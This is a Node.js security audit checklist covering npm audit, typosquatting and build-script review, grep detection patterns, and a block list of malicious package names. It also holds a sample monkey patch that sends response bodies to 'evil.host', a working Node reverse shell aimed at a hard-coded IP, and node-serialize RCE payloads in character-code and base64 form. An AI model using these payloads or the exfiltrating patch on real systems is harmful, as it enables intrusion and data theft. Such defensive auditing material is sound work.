# NodeJs Security Checklist


## 1. Scan Project for known vulnerable packages with ```npm audit```
* This scans the entire package.json file for reported security vulnerabilities
* https://docs.npmjs.com/cli-commands/audit.html

## 2. Check for Outdated packages with ```npm outdated```
* Dependencies in red mean there's an update available
* An outdated package isn't necessarily a security issue, but should be noted and updated if / when appropriate
* https://docs.npmjs.com/cli-commands/outdated.html

## 3. Verify overall project health with command ```npm doctor```
* Verify npm registry is configured correctly
* Verify git access is available
* Review installed npm and Node.js versions
* Run permission checks on various folders such as the local and global ```node_modules``` as well as the folder used for package cache
* Check local npm module cache to ensure all checksums are correct
* https://docs.npmjs.com/cli-commands/doctor.html

 
## 4. Manually review all dependencies in package.json file, check for "typosquatting"
 - Ensure no sensitive information stored in ```process.env``` before performing these checks
 - Look for modules with names similar to popular modules
 - Example: Axois vs Axios

## 5. Review all custom dependencies, check for "monkey patches"
 - Look for use of the "patch-package" npm module
### Sample Monkey Patch:
> ```{
>  // Require the popular `request` module
> const request = require('request')
> // Monkey-patch so every request now runs our function
> const RequestOrig = request.Request
> request.Request = (options) => {
>   const origCallback = options.callback
>   // Any outbound request will be mirrored to evil.host
>   options.callback = (err, httpResponse, body) => {
>     const rawReq = require('http').request({
>       hostname: 'evil.host',
>       port: 8000,
>       method: 'POST'
>     })
>     // Failed requests are silent
>     rawReq.on('error', () => {})
>     rawReq.write(JSON.stringify(body, null, 2))
>     rawReq.end()
>     // The original request is still made and handled
>     origCallback.apply(this, arguments)
>   }
>   if (new.target) {
>     return Reflect.construct(RequestOrig, [options])
>   } else {
>     return RequestOrig(options)
>   }
> };

## 6. Review all build scripts
 - Ensure no malicious scripts are executed during build / install
 - Whenever possible, install packages with the ```--ignore-scripts``` flag to disable execution of any scripts by third-party pacakges
    * Add ```ingore-scripts``` to ```.npmrc``` project file or to global npm config
 - Note any scripts / dependencies named "postinstall"

## 7. Navigate to project root directory, run the following grep commands
| Description | Command |
| ------ | ------ |
child_process module usage | 	```egrep -r --exclude-dir "node_modules" --include "*.js" --exclude "*.min.*" -e "require(\s*)\((\s*)'child_process'(\s*))" . ```
| node-serialize module is loaded | ```egrep -r --exclude-dir "node_modules" --include "*.js" --exclude "*.min.*" -e "require(\s*)\((\s*)'node-serialize'(\s*))". ```
|code dynamically executed | ```egrep -r --exclude-dir "node_modules" --include "*.js" --exclude "*.min.*" -e "eval(\s*)\(" . ```
| Common dangerous functions w/ string args | ```egrep -r --exclude-dir "node_modules" --include "*.js" --exclude "*.min.*" -e "(setInterval|setTimeout|new(\s*)Function)(\s*)\((\s*)\".*\"" . ```
| Common dangerous functions w/ variable args | ```egrep -r --exclude-dir "node_modules" --include "*.js" --exclude "*.min.*" -e "(setInterval|setTimeout|new(\s*)Function)(\s*)\((\s*)" . ```
| Hard-Coded Port values | ```egrep -r --exclude-dir "node_modules" --include "*.js" --include "*.json" --exclude "*.min.*" -e "\"port\.*\"(\s*):(\s*)\d+" .```|
| Hard-Coded IP Addresses | ```egrep -r -e "(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)" .``` |
| User / Pass as JSON Keys | ```egrep -r --exclude-dir "node_modules" --include "*.js" --include "*.json" --exclude "*.min.*" -e "\"(username|user|password|pass)\"(\s*):(\s*)\".*\"" .```
| Known Malicious libraries removed from NPM | ```npm ls | grep -E "babelcli|crossenv|cross-env.js|d3.js|fabric-js|ffmepg|gruntcli|http-proxy.js|jquery.js|mariadb|mongose|mssql.js|mssql-node|mysqljs|nodecaffe|nodefabric|node-fabric|nodeffmpeg|nodemailer-js|nodemailer.js|nodemssql|node-opencv|node-opensl|node-openssl|noderequest|nodesass|nodesqlite|node-sqlite|node-tkinter|opencv.js|openssl.js|proxy.js|shadowsock|smb|sqlite.js|sqliter|sqlserver|tkinter"```|
| Base64 Encoded Strings > 40 Characters | ```egrep -r --exclude-dir "node_modules" --include "*.js" --include "*.json" --exclude "*.min" -e '[[:alnum:]/+]{40,}' .```

## 7b. Optional Grep Commands, run all that are relevant to codebase
| Description | Command |
| ------ | ------ |
| unsafe SQL Queries | ```	egrep -r --exclude-dir "node_modules" --include "*.js" --exclude "*.min.*" -e "\.(execQuery|query)(\s*)\((\s*)\".*\".*\+" . ```
| Hard-Coded dB Credentials (mongoose) | ```egrep -r --exclude-dir "node_modules" --include "*.js" --exclude "*.min.*" -e "\.(createConnection|connect)(\s*)\(" .```
| DOM-Based XSS | ```egrep -r --exclude-dir "node_modules" --include "*.js" --exclude "*.min.*" -e "(window.)?location((\s*)|\.)(href)?\=" .```
| CSRF Protections (Express) | ```egrep -r --exclude-dir "node_modules" --include "*.js" --include "*.json" --exclude "*.min.*" -e "csrf" .```


# Notes
## Understand module naming conventions to prevent Typosquatting
* Limited to 214 characters
* Cannot start with dot or underscore
* No uppercase letters in the name
* No trailing spaces
* Only lowercase
* Some special characters are not allowed: “~\’!()*”)’
* Can’t start with . or _
* Names node_modules or favicon.ico are banned

## Use an Enforcable lockfile
* If NPM / Yarn detect a difference between ```package.json``` and ```package-lock.json```, both will default to using ```package.json```
* Use command ```npm ci``` instead of ```npm install``` to perform a clean install of all dependencies based on content of lockfile

## Avoid Publishing Secrets to Registry
* If project contains either ```.gitignore``` or ```.npmignore```, contents of the file will be ignored when preparing package for publishing
* If both ```.gitignore``` and ```.npmignore``` exist, everything not located in ```.npmignore``` will be published to the registry
    * This can create a situation where sensitive information is ignored from source control, but still pushed to npm registry
* NPM's ```file``` property in package.json can also be used to create a whitelist of files to include in the package

## Using a local NPM Proxy
* Use ```npm set registry``` to setup a new default registry
* Use ```--registry`` argument to add a single registry
* Add the following to package.json to push to custom registry
  > “publishConfig”: {
    “registry”: "https://npm.registry.js"
  > };

## Build and Run project in a fresh test environment, check for suspicious network connections 
* ```ss``` to check for unusual socket connections
* ```nethogs``` to monitor network connections by process.

# Shell Examples

### Standard Node Reverse Shell
```{
// Require the popular `net` and `child_process` modules
var net = require('net);
var spawn = require('child_process').spawn;
const HOST = "67.207.86.76";
const PORT = "9999"
const TIMEOUT = "5000"
if (typeof String.prototype.contains === 'undefined') {       String.prototype.contains = function(it) { return this.indexOf(it) != -1; }; }
  function c(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
      var sh = spawn('/bin/sh', []);
      client.write("Connected!\n");
      client.pipe(sh.stdin);
      sh.stderr.pipe(client);
      sh.on('exit', function(code, signal) {
        client.end("Disconnected!\n");
      });
    });
    client.on('error', function(e) {
      setTimeout(function(){c(HOST,PORT)}, TIMEOUT);
    })
  }
c(HOST,PORT);
}
```

### Create Shell Payload from String Character Codes
> ```{
	"rce": "_$$ND_FUNC$$_function (){ eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,50,55,46,48,46,48,46,49,34,59,10,80,79,82,84,61,34,49,51,51,55,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()"}


### Base64 Encoded Shell


	{rceB64: 'J3sKCSJyY2UiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uICgpeyBldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTAsNTUsNDYsNDgsNDYsNDgsNDYsNDksMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTEsNTEsNTUsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpfSgpIgp9Jw=='
}
```
}